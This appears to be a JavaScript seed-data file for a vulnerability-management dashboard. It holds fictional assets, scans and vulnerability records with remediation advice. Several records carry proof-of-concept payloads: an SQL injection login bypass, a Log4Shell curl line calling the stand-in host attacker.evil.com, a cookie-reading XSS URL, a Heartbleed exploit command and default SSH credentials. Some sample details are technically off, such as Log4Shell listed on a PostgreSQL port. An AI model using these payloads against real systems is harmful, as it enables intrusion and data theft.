export const INITIAL_ASSETS = [
  {
    id: 'ast-001',
    hostname: 'api.internal-auth.prod',
    ip: '192.168.1.105',
    os: 'Ubuntu Linux 22.04 LTS',
    openPorts: [80, 443, 22, 8080],
    lastScan: '2026-07-28',
    riskScore: 9.2,
    status: 'Vulnerable',
    services: [
      { port: 80, name: 'http', service: 'nginx/1.18.0', protocol: 'tcp' },
      { port: 443, name: 'https', service: 'nginx/1.18.0 (SSL)', protocol: 'tcp' },
      { port: 22, name: 'ssh', service: 'OpenSSH 8.9p1', protocol: 'tcp' },
      { port: 8080, name: 'http-proxy', service: 'Node.js Express App', protocol: 'tcp' }
    ],
    vulnCount: { critical: 2, high: 3, medium: 1, low: 4 }
  },
  {
    id: 'ast-002',
    hostname: 'db-primary.finance.internal',
    ip: '10.0.4.12',
    os: 'Red Hat Enterprise Linux 9',
    openPorts: [5432, 22, 9100],
    lastScan: '2026-07-29',
    riskScore: 7.8,
    status: 'Vulnerable',
    services: [
      { port: 5432, name: 'postgresql', service: 'PostgreSQL 14.5', protocol: 'tcp' },
      { port: 22, name: 'ssh', service: 'OpenSSH 8.7p1', protocol: 'tcp' },
      { port: 9100, name: 'prometheus', service: 'Node Exporter', protocol: 'tcp' }
    ],
    vulnCount: { critical: 1, high: 2, medium: 4, low: 2 }
  },
  {
    id: 'ast-003',
    hostname: 'portal-app.customer-gateway.com',
    ip: '172.16.20.45',
    os: 'Windows Server 2022',
    openPorts: [80, 443, 3389, 445],
    lastScan: '2026-07-25',
    riskScore: 8.5,
    status: 'Vulnerable',
    services: [
      { port: 80, name: 'http', service: 'Microsoft-IIS/10.0', protocol: 'tcp' },
      { port: 443, name: 'https', service: 'Microsoft-IIS/10.0', protocol: 'tcp' },
      { port: 3389, name: 'ms-wbt-server', service: 'Remote Desktop', protocol: 'tcp' },
      { port: 445, name: 'microsoft-ds', service: 'SMB v3', protocol: 'tcp' }
    ],
    vulnCount: { critical: 1, high: 4, medium: 2, low: 1 }
  },
  {
    id: 'ast-004',
    hostname: 'edge-router-core-01',
    ip: '192.168.1.1',
    os: 'Cisco IOS-XE 17.6.3',
    openPorts: [22, 161, 443],
    lastScan: '2026-07-30',
    riskScore: 3.4,
    status: 'Secure',
    services: [
      { port: 22, name: 'ssh', service: 'Cisco SSH', protocol: 'tcp' },
      { port: 161, name: 'snmp', service: 'SNMPv3', protocol: 'udp' },
      { port: 443, name: 'https', service: 'Cisco Web UI', protocol: 'tcp' }
    ],
    vulnCount: { critical: 0, high: 0, medium: 2, low: 3 }
  },
  {
    id: 'ast-005',
    hostname: 'k8s-ingress-proxy.prod',
    ip: '10.0.1.50',
    os: 'Alpine Linux (Container OS)',
    openPorts: [80, 443, 8443, 9090],
    lastScan: '2026-07-30',
    riskScore: 6.1,
    status: 'Vulnerable',
    services: [
      { port: 80, name: 'http', service: 'HAProxy 2.6.2', protocol: 'tcp' },
      { port: 443, name: 'https', service: 'HAProxy 2.6.2', protocol: 'tcp' },
      { port: 8443, name: 'https-alt', service: 'Envoy Proxy', protocol: 'tcp' },
      { port: 9090, name: 'http-metrics', service: 'Prometheus Server', protocol: 'tcp' }
    ],
    vulnCount: { critical: 0, high: 1, medium: 3, low: 5 }
  }
];

export const INITIAL_SCANS = [
  {
    id: 'scn-101',
    name: 'Nmap Full Port Perimeter Sweep',
    scanner: 'Nmap XML',
    target: '192.168.1.0/24',
    date: '2026-07-30 14:22',
    status: 'Completed',
    findingsCount: 14,
    criticalCount: 2,
    highCount: 4,
    medCount: 5,
    lowCount: 3
  },
  {
    id: 'scn-102',
    name: 'Nessus Production Infrastructure Audit',
    scanner: 'Nessus',
    target: '10.0.4.0/22',
    date: '2026-07-29 09:15',
    status: 'Completed',
    findingsCount: 28,
    criticalCount: 4,
    highCount: 8,
    medCount: 10,
    lowCount: 6
  },
  {
    id: 'scn-103',
    name: 'Burp Suite Pro DAST Web Application Scan',
    scanner: 'Burp XML',
    target: 'https://portal-app.customer-gateway.com',
    date: '2026-07-28 18:40',
    status: 'Completed',
    findingsCount: 9,
    criticalCount: 1,
    highCount: 3,
    medCount: 3,
    lowCount: 2
  },
  {
    id: 'scn-104',
    name: 'Nuclei CVE Zero-Day Automated Scan',
    scanner: 'Nuclei',
    target: 'api.internal-auth.prod',
    date: '2026-07-27 11:05',
    status: 'Completed',
    findingsCount: 6,
    criticalCount: 2,
    highCount: 2,
    medCount: 1,
    lowCount: 1
  },
  {
    id: 'scn-105',
    name: 'Nikto Web Server Configuration Check',
    scanner: 'Nikto',
    target: '192.168.1.105:8080',
    date: '2026-07-26 16:30',
    status: 'Completed',
    findingsCount: 5,
    criticalCount: 0,
    highCount: 1,
    medCount: 2,
    lowCount: 2
  }
];

export const INITIAL_VULNERABILITIES = [
  {
    id: 'vuln-001',
    title: 'SQL Injection in Authentication API Endpoint',
    cve: 'CVE-2024-21887',
    severity: 'Critical',
    cvss: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    host: 'api.internal-auth.prod',
    ip: '192.168.1.105',
    port: 8080,
    affectedParameter: 'username (POST /api/v1/auth/login)',
    scanner: 'Burp XML',
    status: 'Open',
    assignedTo: 'Alex Mercer (Security Lead)',
    description: 'The login authentication API endpoint fails to sanitize user-supplied data passed in the username parameter before constructing raw SQL queries. An unauthenticated remote attacker can exploit this vulnerability to dump the database containing hashed passwords, session tokens, and administrative credentials.',
    businessImpact: 'Complete compromise of customer authentication data, potential unauthorized account takeover, loss of compliance (PCI-DSS & HIPAA), severe reputation damage.',
    technicalImpact: 'Remote arbitrary database query execution, data exfiltration, database administrative user access escalation.',
    owasp: 'A03:2021 - Injection',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    mitre: 'T1190: Exploit Public-Facing Application',
    poc: `POST /api/v1/auth/login HTTP/1.1
Host: api.internal-auth.prod
Content-Type: application/json

{
  "username": "admin' OR 1=1;--",
  "password": "password123"
}

-- Payload output response:
HTTP/1.1 200 OK
{
  "status": "success",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": { "id": 1, "role": "SUPER_ADMIN" }
}`,
    evidence: 'Server returned HTTP 200 OK with full administrative JWT token when supplied with payload admin\' OR 1=1;--',
    remediation: 'Implement parameterized SQL queries / prepared statements using Object Relational Mapping (ORM) or PDO. Never concatenate raw user inputs into SQL query strings.',
    remediationSnippet: `// BEFORE (Vulnerable Code):
const query = \`SELECT * FROM users WHERE username = '\${req.body.username}' AND password = '\${req.body.password}'\`;

// AFTER (Secure Fix):
const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const result = await db.query(query, [req.body.username, hashedPassword]);`,
    references: [
      'https://cwe.mitre.org/data/definitions/89.html',
      'https://owasp.org/Top10/A03_2021-Injection/',
      'https://nvd.nist.gov/vuln/detail/CVE-2024-21887'
    ]
  },
  {
    id: 'vuln-002',
    title: 'Log4Shell Unauthenticated Remote Code Execution',
    cve: 'CVE-2021-44228',
    severity: 'Critical',
    cvss: 10.0,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    host: 'db-primary.finance.internal',
    ip: '10.0.4.12',
    port: 5432,
    affectedParameter: 'User-Agent Header / JNDI Lookup',
    scanner: 'Nessus',
    status: 'In Progress',
    assignedTo: 'Sarah Connor (PenTester)',
    description: 'Apache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.',
    businessImpact: 'Total server takeover, potential lateral movement to internal banking databases, ransomware deployment risk.',
    technicalImpact: 'Unauthenticated remote code execution with root/system privileges on the target database host.',
    owasp: 'A06:2021 - Vulnerable and Outdated Components',
    cwe: 'CWE-502: Deserialization of Untrusted Data',
    mitre: 'T1210: Exploitation of Remote Services',
    poc: `curl -H 'User-Agent: \${jndi:ldap://attacker.evil.com/a}' http://db-primary.finance.internal:5432/`,
    evidence: 'Received DNS callback from 10.0.4.12 to external attacker LDAP control server.',
    remediation: 'Upgrade log4j2 library to version 2.17.1 or higher immediately. Set JVM flag -Dlog4j2.formatMsgNoLookups=true as emergency temporary mitigation.',
    remediationSnippet: `# Maven pom.xml fix:
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>`,
    references: [
      'https://logging.apache.org/log4j/2.x/security.html',
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
    ]
  },
  {
    id: 'vuln-003',
    title: 'OpenSSL Out-of-Bounds Memory Buffer Read (Heartbleed)',
    cve: 'CVE-2014-0160',
    severity: 'High',
    cvss: 7.5,
    cvssVector: 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    host: 'portal-app.customer-gateway.com',
    ip: '172.16.20.45',
    port: 443,
    affectedParameter: 'TLS Heartbeat Extension',
    scanner: 'Nmap XML',
    status: 'Open',
    assignedTo: 'Marcus Vance (SOC Analyst)',
    description: 'An information disclosure vulnerability in OpenSSL TLS heartbeat extension allows attackers to leak 64KB memory blocks repeatedly from target web server process memory.',
    businessImpact: 'Exposure of SSL private keys, active session cookies, customer passwords in plaintext.',
    technicalImpact: 'Unauthenticated remote process memory read.',
    owasp: 'A02:2021 - Cryptographic Failures',
    cwe: 'CWE-126: Buffer Over-read',
    mitre: 'T1005: Data from Local System',
    poc: `python3 heartbleed_exploit.py portal-app.customer-gateway.com 443`,
    evidence: 'Retrieved 64KB of process RAM containing HTTP authorization cookies.',
    remediation: 'Upgrade OpenSSL package to 1.0.1g or rebuild OpenSSL with -DOPENSSL_NO_HEARTBEATS.',
    remediationSnippet: `# Ubuntu/Debian fix:
sudo apt-get update && sudo apt-get --only-upgrade install openssl libssl-dev`,
    references: [
      'https://heartbleed.com/',
      'https://nvd.nist.gov/vuln/detail/CVE-2014-0160'
    ]
  },
  {
    id: 'vuln-004',
    title: 'Cross-Site Scripting (Reflected XSS) in Search Endpoint',
    cve: 'CVE-2024-38910',
    severity: 'Medium',
    cvss: 6.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    host: 'portal-app.customer-gateway.com',
    ip: '172.16.20.45',
    port: 80,
    affectedParameter: 'q (GET /search)',
    scanner: 'Burp XML',
    status: 'Resolved',
    assignedTo: 'Elena Rostova (Security Auditor)',
    description: 'The search result page reflects the search parameter back to the user without proper HTML entity encoding.',
    businessImpact: 'Session hijacking, phishing redirection, client-side token theft.',
    technicalImpact: 'Arbitrary JavaScript execution in victim user browser session context.',
    owasp: 'A03:2021 - Injection',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    mitre: 'T1189: Drive-by Compromise',
    poc: `https://portal-app.customer-gateway.com/search?q=<script>alert(document.cookie)</script>`,
    evidence: 'Script executed in DOM context rendering javascript alert pop-up.',
    remediation: 'Use DOMPurify or framework HTML escaping libraries (e.g. React JSX default escaping). Set Content-Security-Policy (CSP) headers.',
    remediationSnippet: `// DOMPurify sanitization
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(userSearchInput);`,
    references: [
      'https://owasp.org/www-community/attacks/xss/'
    ]
  },
  {
    id: 'vuln-005',
    title: 'Default Administrative Credentials on SSH Service',
    cve: 'N/A (Misconfiguration)',
    severity: 'High',
    cvss: 8.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    host: 'api.internal-auth.prod',
    ip: '192.168.1.105',
    port: 22,
    affectedParameter: 'SSH Username / Password',
    scanner: 'Nikto',
    status: 'Open',
    assignedTo: 'Alex Mercer (Security Lead)',
    description: 'SSH server allows login using standard vendor default credentials (admin:admin123).',
    businessImpact: 'Unauthenticated administrative shell access to core API node.',
    technicalImpact: 'Direct interactive Bash terminal shell access.',
    owasp: 'A05:2021 - Security Misconfiguration',
    cwe: 'CWE-1392: Use of Default Credentials',
    mitre: 'T1078: Valid Accounts',
    poc: `ssh admin@192.168.1.105 (Password: admin123)`,
    evidence: 'SSH login banner granted interactive shell session.',
    remediation: 'Enforce SSH public-key authentication only. Disable password authentication in sshd_config.',
    remediationSnippet: `# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes`,
    references: [
      'https://www.cisecurity.org/benchmark/ubuntu_linux'
    ]
  }
];

export const INITIAL_THREAT_INTEL = [
  {
    cve: 'CVE-2024-6387',
    title: 'regreSSHion: Remote Code Execution in OpenSSH Server',
    epss: 0.942,
    epssPercentile: '98th percentile',
    cvss: 8.1,
    severity: 'High',
    vendor: 'OpenSSH Project',
    patchStatus: 'Patch Available (v9.8p1)',
    cisaKev: true,
    publishedDate: '2024-07-01',
    summary: 'A signal handler race condition vulnerability was identified in OpenSSH server (sshd) in glibc-based Linux systems allowing unauthenticated remote code execution as root.'
  },
  {
    cve: 'CVE-2024-21683',
    title: 'Atlassian Confluence Data Center Code Execution',
    epss: 0.885,
    epssPercentile: '95th percentile',
    cvss: 9.0,
    severity: 'Critical',
    vendor: 'Atlassian',
    patchStatus: 'Patch Available',
    cisaKev: true,
    publishedDate: '2024-05-21',
    summary: 'An authenticated remote code execution vulnerability exists in Confluence Data Center and Server allowing attackers to inject arbitrary macro scripts.'
  },
  {
    cve: 'CVE-2024-4577',
    title: 'PHP CGI Argument Injection RCE (Windows)',
    epss: 0.965,
    epssPercentile: '99th percentile',
    cvss: 9.8,
    severity: 'Critical',
    vendor: 'PHP Group',
    patchStatus: 'Patch Available',
    cisaKev: true,
    publishedDate: '2024-06-06',
    summary: 'When PHP is configured in CGI mode on Windows, character encoding conversions in Best-Fit mapping allow attackers to bypass CVE-2012-1823 checks and execute arbitrary code.'
  },
  {
    cve: 'CVE-2024-30078',
    title: 'Windows Wi-Fi Driver Remote Code Execution',
    epss: 0.412,
    epssPercentile: '82nd percentile',
    cvss: 8.8,
    severity: 'High',
    vendor: 'Microsoft Corporation',
    patchStatus: 'Patch Available (Patch Tuesday June 2024)',
    cisaKev: false,
    publishedDate: '2024-06-11',
    summary: 'An unauthenticated attacker within physical Wi-Fi proximity can send crafted packets to execute arbitrary code on target Windows endpoints.'
  }
];

export const INITIAL_REPORTS = [
  {
    id: 'rep-01',
    title: 'Q3 Enterprise Perimeter VAPT Assessment',
    date: '2026-07-28',
    client: 'Acme Financial Corp',
    scanSource: 'Nmap & Nessus Consolidated',
    type: 'Executive & Technical',
    status: 'Finalized',
    author: 'Alex Mercer'
  },
  {
    id: 'rep-02',
    title: 'Customer Gateway DAST Security Audit',
    date: '2026-07-25',
    client: 'Internal Product Security',
    scanSource: 'Burp Suite Pro DAST',
    type: 'Technical PenTest',
    status: 'Finalized',
    author: 'Sarah Connor'
  },
  {
    id: 'rep-03',
    title: 'PCI-DSS v4.0 Compliance Audit Report',
    date: '2026-07-15',
    client: 'Finance & Payments Dept',
    scanSource: 'Full Scope Infrastructure',
    type: 'Compliance Audit',
    status: 'Archived',
    author: 'Elena Rostova'
  }
];

export const INITIAL_AI_CHAT = [
  {
    id: 1,
    sender: 'assistant',
    text: 'Hello! I am **SentinelAI RAG Assistant**, your autonomous cybersecurity copilot. I can analyze your uploaded scan reports, prioritize findings, write exploits/remediations, generate executive summaries, and answer technical CVE questions. How can I assist your VAPT team today?',
    timestamp: '10:00 AM'
  }
];

export const INITIAL_AUDIT_LOGS = [
  { id: 'log-1', timestamp: '2026-07-30 14:22:10', user: 'alex.mercer@sentinel.ai', action: 'Scan Uploaded', resource: 'Nmap_Sweep_Q3.xml', ip: '192.168.1.50', status: 'Success' },
  { id: 'log-2', timestamp: '2026-07-30 13:10:05', user: 'sarah.connor@sentinel.ai', action: 'Vulnerability Status Change', resource: 'CVE-2024-38910 -> Resolved', ip: '192.168.1.88', status: 'Success' },
  { id: 'log-3', timestamp: '2026-07-30 11:45:30', user: 'alex.mercer@sentinel.ai', action: 'Report Generated', resource: 'Executive_Summary_Q3.pdf', ip: '192.168.1.50', status: 'Success' },
  { id: 'log-4', timestamp: '2026-07-29 17:02:18', user: 'system_bot', action: 'Threat Intel Sync', resource: 'NVD & EPSS Feed Update', ip: '127.0.0.1', status: 'Success' },
  { id: 'log-5', timestamp: '2026-07-29 09:16:40', user: 'marcus.vance@sentinel.ai', action: 'API Token Generated', resource: 'CI/CD Pipeline Scanner Key', ip: '10.0.2.14', status: 'Success' }
];

export const SAMPLE_NMAP_XML = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -sV -p 80,443,22,8080 -oX nmap_output.xml 192.168.1.200" start="1785400000" version="7.94">
  <host>
    <address addr="192.168.1.200" addrtype="ipv4"/>
    <hostnames><hostname name="staging-server.internal.net" type="PTR"/></hostnames>
    <ports>
      <port protocol="tcp" portid="22"><state state="open"/><service name="ssh" product="OpenSSH" version="8.2p1"/></port>
      <port protocol="tcp" portid="80"><state state="open"/><service name="http" product="Apache httpd" version="2.4.41"/></port>
      <port protocol="tcp" portid="443"><state state="open"/><service name="https" product="Apache httpd" version="2.4.41 (SSL)"/></port>
      <port protocol="tcp" portid="8080"><state state="open"/><service name="http-proxy" product="Jenkins Server" version="2.319"/></port>
    </ports>
  </host>
</nmaprun>`;
